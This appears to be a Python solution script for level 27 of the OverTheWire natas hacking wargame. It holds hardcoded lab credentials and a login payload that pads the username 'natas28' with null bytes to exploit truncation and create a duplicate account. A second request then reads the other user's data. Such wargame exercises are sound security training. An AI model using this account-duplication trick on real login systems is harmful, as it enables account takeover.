#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas27'
password = 'u3RRffXjysjgwFU6b9xa23i6prmUsYne'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

# response = session.get(url, auth = (username, password))
# print response.text
response = session.post(url, data = \
				{"username" : "natas28" + "%00"*58+"anything",
				 "password" : "anything"},
		auth = (username, password))


response = session.post(url, data = \
				{"username" : "natas28",
				 "password" : "anything"},
		auth = (username, password))
print (response.text)